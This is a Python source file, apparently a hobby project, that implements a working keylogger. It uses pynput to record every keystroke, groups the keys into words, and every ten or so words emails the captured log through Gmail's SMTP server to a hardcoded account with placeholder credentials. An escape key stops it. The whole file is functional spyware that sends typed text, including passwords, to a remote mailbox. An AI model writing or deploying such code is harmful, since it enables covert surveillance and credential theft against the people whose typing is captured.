########################################################################
#                                                                      #
#                    Super Awesome Project                             #
#            Keylogging experiment with Emails                         #
#                                                                      #
########################################################################

import logging #for logging to a file
import smtplib #for sending email using SMTP protocol (gmail)

from pynput.keyboard import Key, Listener # for keylogs

########################################################################
#                                                                      #
#                           Emailing keylog                            #
#                                                                      #
########################################################################

# email which receives the keystrokes 
email = 'sample@gmail.com'
password = 'sample'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

########################################################################
#                                                                      #
#                      Keylogging function                             #
#                                                                      #
########################################################################

# storing keys for email
full_log = ""
word = ""
email_char_limit = 10

# Function for when key is pressed
def on_press(key):
    global full_log, word, email_char_limit
    print("{0} pressed".format(key))

    clean_key = str(key).replace("'","")
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log.split()) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    elif clean_key.find("Key") != -1:
        word += ' '
        word += clean_key
        word += ' '
    else:
        char = str(key).replace("'","")
        word += char

# Failsafe to break keylogger file - currently set at esc key
def on_release(key):
    if key == Key.esc:
        return False

########################################################################
#                                                                      #
#                            Emailing keylog                           #
#                                                                      #
########################################################################
# send the Code that Sends the Append Keys is Press
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

########################################################################
#                                                                      #
#                            With Listener                             #
#                                                                      #
########################################################################
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
